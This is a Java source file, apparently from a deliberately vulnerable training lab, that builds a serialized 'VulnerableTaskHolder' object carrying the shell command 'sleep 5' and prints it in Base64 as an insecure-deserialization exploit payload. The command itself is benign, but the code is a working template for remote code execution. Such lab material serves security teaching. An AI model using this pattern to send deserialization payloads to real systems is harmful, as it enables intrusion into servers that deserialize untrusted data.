package org.dummy.insecure.framework;

/*
 * Go to the "src" folder and run the following to compile and execute:
 *     javac -cp . org/dummy/insecure/framework/*.java
 *     java -cp . org/dummy/insecure/framework/Main
 */

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class Main {

    public static void main(String[] args) {
        VulnerableTaskHolder go = new VulnerableTaskHolder("sleeper", "sleep 5");

        ByteArrayOutputStream bos = new ByteArrayOutputStream();

        try {
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(go);
            oos.flush();
            byte[] exploit = bos.toByteArray();

            System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));
        }
        catch (IOException e) {
            System.out.println(e.getMessage());
        }
    }
}
